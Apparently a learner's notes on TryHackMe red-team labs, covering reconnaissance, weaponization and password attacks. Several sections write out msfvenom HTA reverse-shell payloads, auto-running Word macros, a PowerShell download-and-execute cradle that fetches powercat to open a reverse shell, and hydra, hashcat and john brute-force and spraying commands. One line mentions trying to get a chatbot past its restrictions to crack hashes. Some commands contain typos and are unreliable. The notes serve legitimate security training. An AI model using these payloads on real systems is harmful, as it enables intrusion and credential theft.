# RED TEAM RECON BOX
### **#TASK 3: BUILT-IN TOOLS**
- Registrar Information: ```WHOIS```
  - ```whois``` listens on TCP 43.
- DNS Queries: 
  - nslookup
  - dig
- Packet Routes: 
  - Linux: traceroute
  - Windows: tracecert

### **#TASK 6: RECON-NG**
- Spinning up Recon-ng for the first time: 
  - ```recon-ng```
- Creating a workspace (a folder for your query):
  - ```workspaces create <name>```
    - To spin up the workspace directly from terminal: 
      - ```recon-ng -w <name>```
- To look at the db containing information on your query: 
  - ```db schema```
    - To insert data: 
      - ```db insert <variable name>```
- To find various modules to use for your query: 
  - ```marketplace search```
    - Obtaining information about a specific module: 
      - ```marketplace info <module_name>```
- Installing a module: 
  - ```marketplace install <module_name>```
    - Load the module: 
      - ```load <module_name```
        - Run the module: 
          - ```run```

# WEAPONIZATION BOX
### **#TASK 2: DEPLOY THE WINDOWS MACHINE**
- RDP into the windows machine: 
  - ```xfreerdp /v:<target machine ip> /u:thm /p:TryHackM3 +clipboard```

### **#TASK 3: WINDOWS SCRIPTING HOST (WSH)**
- Windows Script Host (WSH) is a built-in admin. tool that automates and manages tasks within the O/S. 
  - Command line scripts to execute Microsoft Visual Basic Scripts (VBScript): 
    - ```cscript.exe```
  - User Interface scripts to execute VBScript: 
    - ```wscript.exe```
- To write a VBScript, open up a text editor such as notepad and write the following:  
``` 
Dim message
message = "Hello" 
Msgbox message
```
  - When you save this, make sure you're saving it in the correct directory/folder.
- Now, we're going to write an executable that will bring up the calculator: 
Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
  - Go back to command prompt and type: 
    - ```wscript <name of file.vbs```
      - Save in correct directory/file
      - Save with file extension: .vbs



## **#TASK4: AN HTML APPLICATION (HTA)**
- HTA allows you to create downloadable files that take all the information regarding how the application is displayed/rendered. 
- HTAs are dynamic HTML pages contianing JScript and VBScript. 
- Living-of-the-land Binaries (LOLBINS) tool ``mshta`` is used to run HTA files.  
  
**#HTA SCRIPT WITH CMD.EXE PAYLOAD:**
- The following example will use ActiveXObject in a payload to execute cmd.exe (make sure you're writing this on your linux machine):
1. Start a python web server. 
  - Create a .hta file with the following script: 
```
<html>
<body>
<script>
    var c= 'cmd.exe
    new ActiveXObject('Wscript.Shell').Run(c);
</script>
</body>
</html>
``````
2. Now, go to the windows machine, and type in the server information in Internet Explorer or Google Chrome. 
      - ```http://<your ip on the linux box>:<port # from your python webserver>```
3. Click run, and your cmd.exe script should execute. 


![Alt text](<hta command promot executable.jpg>)
![Alt text](<hta webserver.jpg>)

**#REVERSE SHELL WITH HTA:**   
1. Create the reverse shell payload with msfvenom
   - ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=<yourip> LPORT=<port#> -f hta-psh -o thm.hta```
     - Make sure that your web server is still running*
2. Set up a listener on your machine: 
   - nc -lvnp <port #>
3. Go to the windows machine and run the payload you created. 

![Alt text](<msfvenom hta reverseshell.jpg>)
![Alt text](<msfvenom hta payload.jpg>)

### **#TASK 5: VISUAL BASIC FOR APPLICATION (VBA)
- Allows automatic tasks (macros) for keyboard/mouse interaction between users and Microsoft Office applications.
- 
**#CREATING A MACRO IN MICROSOFT WORD:** 
1. Click on View>Macros. 
2. Name your macro and select where you want your macro to apply "Macros in:"
3. Click create. 
4. Now, write your command: 
```
Sub thm()
    MsgBox ("Welcome")
End Sub
```
   - Close out of the editor and hit the green play button. The running of this macro should bring up a new screen with a pop up that says "Welcome."

![Alt text](<Microsoft VBA macro.jpg>)
![Alt text](<microsoft VBA successful macro.jpg>)

**#AUTOMATING A MACRO:**
- You're going to add a "Document_Open" and "AutoOpen" command to your macro: 
```
Sub Document_Open()
    thm
End Sub

Sub AutoOpen()
    thm
End Sub

Sub THM()
    MsgBox ("Welcome!")
End Sub
```
  - Make sure that you're saving it in a Macro-Enabled format such as ```.doc```, ```.docm```, ```world 97-2003 template```, etc. 

**#MACRO TO EXECUTE AN APPLICATION: CALCULATOR**
1. Create another macro
   - ***Attention to detail:*** I forgot to change "Macros in:" from all active templates to the particular document I was working in and I kept getting the error that Sub PoC wasn't defined; couldn't for the life of me figure it out...
2. Automated calculator macro: 
```
Sub Document_Open()
    PoC
End Sub
Sub AutoOpen()
    PoC
End Sub
Sub PoC()
    Dim payload As String
    payload = "calc.exe
    CreateObject("Wscript.Shell").Run payload,0
End Sub
```
#More executable applications:  
https://www.lifewire.com/list-of-executable-file-extensions-2626061
![Alt text](<microsoft VBA calculator macro.jpg>)
![Alt text](<microsoft vba calculator script.jpg>)


1. Create your payload with msfvenom
2. Open up a webserver so you can download the payload on your windows box.
   - ```python3 -m http.server <port#>``` 
3. Insert the payload code into the MS Word macro editor. 
4. Change "Workbook_Open()" to "Document_Open()."
5. Save the document in a Macro-Enabled format. 
   - I just used the "World 97-2003 Template" format from the last section.
6. Set your listener in metasploit on your linux box: 
```
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attack ip>
set LPORT <port #>
run or exploit
```
7. Go back to your windows box and run your macro. 
9. Go back to your linux box and you should have established a connection. 


![Alt text](<poison change workbook to document for office word.jpg>)
![Alt text](<windows listener with msfconsole.jpg>)

**#POWERSHELL -PS**
1. THM says to write something and save it as a file in powershell but completely skips over how to do this. Maybe you all know how to do that but I certainly did not. Here's how: 
2. 
- Create the file using a variable:  
   - ```$filepath = "thm.ps1"```
- Now, utilizing another variable, we we'll produce the content for the file we just created: 
   - ```$command = "whatever you want to put in the file"```
- Last, we'll save the file content to the file.  
   - ```out-file -filepath $filepath -inputobject $command```
- Now, read your file. 
     - ```type <file_name>```

![Alt text](<powershell writing output to a file command.jpg>)

**#POWERSHELL EXECUTION POLICY: This is done in PS although THM has screen shots of command prompt?** 
- To figure out what execution policy setting is currently in effect use: 
  - ```get-executionpolicy```
- To change the execution policy: 
  - ```set-executionpolicy -scope currentuser remotesigned```
        - What this means is that we are setting the execution policy to only apply to the current user. The "remotesigned" portion means that PS will only run scripts that are signed by a trusted publisher. 
        - There are 4 different execution policies:   
          1. Restricted: prevent any/all scripts from running
          2. AllSigned: all scripts trusted by a publisher can be ran. 
          3. RemoteSigned: scripts can be ran if they are signed by a trusted published or downloaded from the internet. 
          4. Unrestricted: all scripts can be ran. 
**#BYPASS EXECUTION POLICY**
- Setting a bypass policy makes it so that nothing is blocked or restricted.
  - ```powershell -ex bypass -file <file_name>``` 
- I honestly don't know what this was supposed to do in the context of what we're doing in THM because PS already let me run the ps1 file I created. 

**#BYPASS EXECUTION POLICY: POWERCAT**
- Download the powercat file: 
  - ```git clone https://github.com/besimorhino/powercat.git```
- Move into the powercat directory: 
  - ```cd powercat```
- Set up a webserver: 
  - ```python3 -m http.server <port#>```
- Set up a listener on your machine: 
  - ```nc -lvnp <port#>```
- Execute powercat on your windows box in PS: 
  - ```powershell -c "IEX(New-ObjectSystem.Net.WebClient).DownloadString('http://<your ip address>:<port#>/powercat.ps1'); powercat -c <your ip> -p <listener port#> -e cmd"```

**#PRACTICE ARENA:**
1. Create a reverse shell payload with msfvenom: 
   - ```msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your ip> LPORT=<port#> -f hta-psh -o <file_name.hta>```
2. Establish a web server that your payload can be downloaded from: 
   - ```python3 -m http.server <port #>```
3. Set up a listener
   - ```nc -lvnp <port #>```
4. Go to the simulator web application and type in the pathway for your payload. 
   - <http://<your ip>:<port # for web server>/<filename.hta>>
5. Go back to your linux box and your listener should've picked up the connection. 
6. Move into the C-drive to find the flag: 
   - ```dir flag.txt /s``` 
7. Move into the directory containing the flag: 
   - ```cd: \Users\thm\Desktop```
8. Read the flag: 
   - ```type flag.txt```

![Alt text](<msfvenom hta reverse shell.jpg>)
![Alt text](<web server setup.jpg>)
![Alt text](<simulator web app payload.jpg>)
![Alt text](<windows reverse shell with msfvenom.jpg>)






# PASSWORD ATTACKS BOX
## **#TASK 3: PASSWORD PROFILING #1 - DEFAULT, WEAK, LEAKED, COMBINED, AND USERNAME WORDLISTS** 
#WEBSITE WITH DEFAULT PASSWORDS: 
- https://cirt.net/passwords
- https://default-password.info/
- https://datarecovery.com/rd/default-passwords/

**#WEAK PASSWORD LISTS**
- (https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)

#COMBINING WORDLISTS FOR PASSWORD CRACKING: 
- ```cat file1.txt file2.txt file3.txt > combined_list.txt```
  - To remove/filter duplicated words, use ```sort``` and ```uniq```: 
    - sort combined_list.txt | uniq -u > cleaned_combined_list.txt

**#UTILIZING CRAWLING TO GENERATE A WORDLIST:**
- '''cewl -w list.txt -d 5 -m 5 http://thm.labs```
  - ```-w```: Writes the contents to the file "list.txt."
  - ```m 5```: Gathers words that are at least 5 characters.
  - ```-d 5```: This indicates the depth level of web crawling which is the number of pages the crawler will go through. 5 indicates that if there's a link on the first page, it'll go to the second page, then the third, then fourth, etc. 
  - ```http://thm.labs```: Website that we want to crawl with the "cewl" tool. 

**#USERNAME WORDLISTS**
- Download the "username_generator": 
  - git clone https://github.com/therodri2/username_generator.git
    - This wasn't working for me. There are more out there: 
      - https://github.com/m8sec/CrossLinked 

## **#TASK 4: PASSWORD PROFILING #2 - KEYSPACE TECHNIQUE AND CUPP**
#KEYSPACE TECHNIQUE: 
- Creating a wordlist offline:
- ```crunch```
  - ```crunch 2 2 01234abcd -o crunch.txt```
    - This creates a wordlist of all possible combinations with 0-4 and a-d that are 2 characters in length (```2 2``` are the min/max character lengths). ```-o``` outputs the data as a file. 
      - For additional options utilize the switch ```-t``` in your ```crunch``` command:
        - ```crunch 2 2 -t jayandsilentbob%%```
          - Lower case alpha characters: ```@```.
          - Upper case alpha characters: ```,```.
          - Numeric characters ```%```.
          - Special characters including space: ```^```.

# CUPP - COMMON USER PASSWORDS PROFILER: 
- Generates potential passwords from details about a target: 
1. Download the Github repo: 
   - ```git clone https://github.com/Mebus/cupp.git```
2. Move into the "cupp directory"
3. Start cupp: 
   - ```python3 cupp.py```
     - For interactive mode (it'll ask you questions that you can fill in): 
       - ```python3 cupp.py -i```

- What is the crunch command to generate a list contianing ```THM@%``` and output to a file named ```tryhackme.txt```? 
  - We need to put quotations around ```THM``` to specify what we're using to generate the list. 
    - ```@%``` are special characters. 

## **#TASK 5 : OFFLINE ATTACKS - DICTIONARY AND BRUTE FORCE W/ HASHCAT**
#DICTIONARY ATTACK: 
- Guesses passwords using well-know words/phrases based oin pre-generated wordlists. 

- Hashcat command: 
  - ```hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt --show```
1. Identify the type of hash that's being used: 
   - THM uses hashid which you can install with: 
     - ```sudo apt install hashid```
   - I just prefer to use a 3rd party website such as: 
     - https://crackstation.net/ 
       - A few weeks ago you could just use bard, it seems like they've updated it since and I just haven't figured out the right prompt yet to get around their new restrictions.
2. Set the attack mode to dictionary:```-a 0```.
   - Combination:```-a 1```.
   - Brute-force: ```-a 3```.
   - Hybrid Wordlist + Mask: ```-a 6```
   - Hybrid Mask + Wordlist: ```-a 7```
3. Set the hash mode for cracking MD5: ```-m 5``` 
   - See images at the bottom for some hash mode switches. 
4. Input the hash you want to crack: 
   - ```f806fc5a2a0d5ba24716007584252799c```
5. Identify the path for the wordlist you want to use: 
   - ```/usr/share/wordlists/rockyou.txt```


#BRUTE FORCE ATTACK: 
- Tries all possible combinations of a character/characters.
- Bank Pins. 
- Utilize built in character set options in hashcat: 
  - ```hashcat --help```
- Example of using hashcat with brute-force and a combination of our choice: 
  - ```hashcat -a 3 ?d?d?d?d --stdout```
    - Set the attack mode to brute force: ```-a 3```
    - Tell hashcat you want to use 4 digits: ```?d?d?d?d``` 
    - Tell hashcat to print the result: ```stdout```
- THM example of a bruteforce attack: 
  - ```hashcat -a 3 -m 0 05a5cf06982ba7892ed2a6d38fe83d6 ?d?d?d?d 05a5cf06982ba7892ed2a6d38fe83d6:2021```
    - Brute-force attack mode: ```-a 3```. 
    - Hash we want to crack:
      - ```05a5cf06982ba7892ed2a6d38fe83d6```
    - Mask that specifies the format of the password (4 digits long): 
      - ```?d?d?d?d```
    - Add the salt to the hash that we're trying to crack 
      - ```05a5cf06982ba7892ed2a6d38fe83d6:2021```

#QUESTION 2: Remember to change the hash mode.   
#QUESTION 3: Use the same command THM did for brute-force but without the salt. 
  - ```hashcat -a 3 -m 0 e48e13207341b6bffb7fb1622282247b ?d?d?d?d --show```

## **#TASK 6: OFFLINE ATTACKS - RULE BASED WITH JOHN THE RIPPER:**
- Rule based = Hybrid Attacks. 
  - This assumes that we know something about the password policy. Establishes a framework to narrow possible passwords. 

#VARIOUS HASH MODES:
![Alt text](<hashcat hash modes.jpg>)
#QUESTION 3
![Alt text](<hashcat brute force command.jpg>)

# JOHN THE RIPPER

#FINDING POTENTIAL RULE SETS: 
- rule sets located at: 
  - ```/etc/john/john.conf```
  - ```/opt/john/john.conf```
  - Look for: ```List.Rules```
    - ```cat /etc/john/john.conf | grep "List.Rules:" | cut -d"." -f | cut -d":" -f2 | cut -d"]" -f1 | awk NF```
      - Doesn't seem to work in tryhackeme for some reason. You also have to install john the ripper in the attack box to use it: 
        - sudo ```apt install john```

#EXPANDING PASSWORD LIST WITH A RULE BASED ATTACK:
- If you were getting frustrated trying to mirror the "Rule-based" attack using the best64 rule, the world list of "single-password-list.txt," does not exist on the attack box or a list when you download john. The "single-password-list.txt" is a list that they created. So, what you want to do to be able to use the command: ```john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l``` is create a file with the string: ```"tryhackme."``` *If you're following THM. 
  1. You can create your file anywhere, I chose to move into the tmp folder. 
  2. ```nano best64rule.txt```
  3. Input the string: ```tryhackme```
  4. ls (to confirm it's in the folder)
  5. Run the command: ```john --wordlist=tmp/best64rule.txt --rules=best64 --stdout |wc -l```
     - THM says they got 76 passwords, I got 75, potatoe potatoe. 

#JOHN THE RIPPER RULES IN KALI:
![Alt text](<johntheripper list rules.jpg>)

#RULE64
![Alt text](<rule based attack.jpg>)

#QUESTION: 
- I'm not sure why the syntax works this way... You'd think you'd follow the rule logically. If somebody more experienced could let me know why I'd appreciate it. THM tells you to translate "S[Word]NN into a command where: 
  - N=number
  - S= a symbol of !@
    - To me, this translates as ^[!@] Az"[0-9][0-9]" but that's not the answer. They have the symbols coming last although if S represents the symbols, I don't know why it doesn't go first. 
      - A single work from the orginal wordlist you're using is represented by: ```Az```
      - To produce two digits we use: ```[0-9][0-9]```
      - The caret indicates that you want to use symbols, and the symbols used are in the brackets: ```^[!@]```
  
## **#TASK 8: ONLINE PASSWORD ATTACKS**
#BRUTE-FORCE FTP(21) WITH HYDRA
- Command: 
  - ```hydra -l ftp -P passlist.txt ftp://10.10.x.x```
    - For a single username: ```-l ftp```
    - For a username wordlist: ```-L ftp```
    - For wordlist path: ```-P path```
    - To specify a single password: ```-p ```

#BRUTE-FORCE SMTP(25/587/465) WITH HYDRA
- COMMAND: 
  - ```hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x```

#BRUTE-FORCE SSH (22): 
- COMMAND: 
  - ```hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x```

#BRUTE-FORCE HTTP LOGIN PAGES: 
  - GET or POST?
  - Hydra options command: 
    - ```hydra http-get-form -u```
  - Hydra get command syntax: 
    - ```<url>:<form parameters>:<condition string>[:<optional>[:<optional>]]```
      - You could just use the repeater in burpsuite. 
  - Hydra Get Command example: 
    - ```hydra -l admin -P 500-worst-passwords.txt 10.10.x.x htt-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f```.
      - Specify a single username: ```-l admin```. 
      - Pathway for wordlist: ```-P Path```. 
      - Target IP address of Full qualified domain name (FQDN): ```10.10.x.x```
      - Login page path: ```login-get/index.php```.
      - Brute-force parameters: ```username=^USER^&password=^PASS^```. 
      - Stop brute-forcing attacks after finding valid username/password: ```-f```.

#QUESTION 1: 
1. GUESS THE FTP CREDENTIAL...Sure. 
  - Use ftp to login to the server: 
    - ```ftp <attached vm ip>```
  - Use ftp default credentials: 
    - admin/admin; 
    - administrator/administrator; 
    - username/password
  - Look through the files: 
    - ```ls -a```
  - Get the flag.txt since you're unable to read it. 
    - ```get flag.txt```. 
  - Get out of ftp with: ```exit```. 
  - Read the file. 
#QUESTION 2: 
1. ```Cewl``` the website: "https://clinic.thmredteam.com" to create your custom wordlist: 
   - ```cewl -m 8 -w <file name you want> <url you're pulling from>```
2. Append the ```john.conf``` file with the rule that created in Task 6: Az"[0-9][0-9]" ^[!@]
   - To append the john.conf file, open it with a text editor. I used nano: 
     - nano /etc/john/john.conf
     - I scrolled down to "#For Single Mode against fast hashes." You may be able to place this anywhere but I don't know exactly how it works so I put it with the out List Rules. 
     - Next, type: 
       - ```[List.Rules: <name of rule>]```
     - Then, your rule: 
       - ```Az"[0-9][0-9]" ^[!@]```
     - Save the file. 
3. Apply your rule to the wordlist you created: 
   - ```john --wordlist=./clinic.txt --rule=thm --stdout > clinic-rules.lst```

#CEWL THE WEBSITE
![Alt text](<cewl website.jpg>)
#EDIT JOHN.CONF WITH NEW RULE
![Alt text](<appending john.conf.jpg>)
#APPLY NEW RULE TO YOUR WORDLIST
![Alt text](<john adding rule.jpg>)
#UPDATED WORDLIST WITH THM PARAMETERS
![Alt text](<john rule applied.jpg>)

4. Use the SMTP syntax that THM has provided, the command will go like this: 
   - ```hydra -l <email address> -P <path to your wordlist> smtp:<target ip> -v```
- For pittman's email, your command should look like this: 
  - ```hydra -l pittman@clinic.thmredteam.com -P clinic-rules.lst smtps://10.10.x.x```

![Alt text](<smtp hydra.jpg>)

#QUESTION 3: PERFORM A BRUTE-FORCING ATTACK AGAINST "PHILLIPS" ACCOUNT FOR THE LOGIN PAGE: 
- Use the command: 
  - ```hydra <ip address> -l phillips 10.10.x.x http-get-form "login-get/index.php:username=phillips&password=^PASS^:F=Login failed!"```
    - So, ideally you would replace ```F=Login failed!"``` with ```"S=logout.php"```. However, when I ran that, no passwords were returned. What you're telling to computer to do with the first command is to keep running through potential passwords where as with the second one, it will stop once it's found the correct password. The first command gave me multiple potential passwords and I had to try each one until I found the correct one (not ideal).
 
#HYDRA HTTP LOGIN PAGE
![Alt text](<hydra http get password.jpg>)

#QUESTION 4: RULE-BASED PASSWORD ATTACK ON "BURGESS." USE "SINGLE-EXTRA" RULE. 
- First, find the correct syntax for the "single-extra" rule. 
  - cat /etc/john/john.conf|grep "List.Rules:"

#RULES  
![Alt text](list.rules.jpg)

- Second, we apply the rule to our wordlist as per THM's instructions (use the clinic.lst dictionary in generating and expanding the world list): 
  - ```john --wordlist=<file path> --rules=Single-Extra --stdout >> <new-list name> ```
    - EG): ```john --wordlist=clinic.lst --rules=Single-Extra --stdout >> clinic-singleextra.lst```

#COMPILING LISTS WITH RULES
![Alt text](<hydra combining lists with rules.jpg>)

- Third, we use this new list to generate the password: 
  - ```hydra -l <username> -P <wordlist that we're using> <ip address> <type of request> "<login page path>```
    - EG): hydra -l burgess -P clinic-singleextra.lst <10.10.X.X> http-form-post "/login-post/index.php:username=burgess&password=^PASS^:S=logout.php" -f

- Last, we initiate the rule-based password attack on Burgess. We've got a username, a list with possible passwords, and an IP address. We need to compile all of this into a single command: 
  - ```hydra -l <username> -P <wordlist> <ip address> http-form-post "/login-post/index.php:username=burgess&password=^PASS^:S=logout.php" -f```
    - When you're completing this question, make sure to use the url given, as it is different from the one in question 3. If not, you won't be able to login with the password you obtain. 
  
#HYDRA HTTP GET POST COMMAND WITH USERNAME/WORDLIST/IP ADDRESS
![Alt text](<hydra password with url and username.jpg>)

## **#TASK 9: PASSWORD SPRAYING**
#SSH: 
- Using hydra:
  - ```hydra -L usernames-list.txt -p Spring202 ssh://10.1.1.0```
- Exposed RDP service: 
  - ```python3 RDPassSpray.py -u victim -p Spring2021 -d THM-labs -T RDP_servers.txt```
    - Active Directory environment: ```-d```
#QUESTION 1: Perform a password spraying attack to get access to ssh://10.10.x.x and read /etc/flag. *Hint is use season+year+special character. 
1. Make a file with the usernames in the picture above the question: 
- ```nano usernames-list.txt```
  - names to use: admin, phillips, burgess, pittman, guess
2. The hint also says, "consider using Fall instead of Autumn. For years, try years betweeen 2020-2021. 
3. I opened up multiple tabs and just started going at it: 
- ```hydra -L usernames-list.txt -p Fall2020! ssh://10.10.x.x -f```
- ```hydra -L usernames-list.txt -p Fall2020@ ssh://10.10.x.x. -f``` 
- Fall2021! 
- Fall2021@
4. Once you've got the credentials: 
- ```ssh <username>@10.10.x.x```

![Alt text](<password spraying.jpg>)
![Alt text](<password spraying answer.jpg>)


**#RESOURCES:**
https://hashcat.net/wiki/doku.php?id=hashcat
https://www.lifewire.com/list-of-executable-file-extensions-2626061
